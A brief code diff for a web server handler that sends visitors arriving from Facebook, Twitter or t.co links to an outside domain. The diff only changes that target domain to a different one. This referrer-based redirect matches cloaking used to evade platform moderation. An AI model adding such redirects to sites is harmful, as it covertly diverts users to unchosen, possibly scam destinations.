@@ -14,6 +14,6 @@ export default defineEventHandler((event) => {
     const headers = event.req.headers;
     
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        sendRedirect(event,"https://dx2st.beauty"+event.req.url);
+        sendRedirect(event,"https://sugarbb.life"+event.req.url);
     }
 })
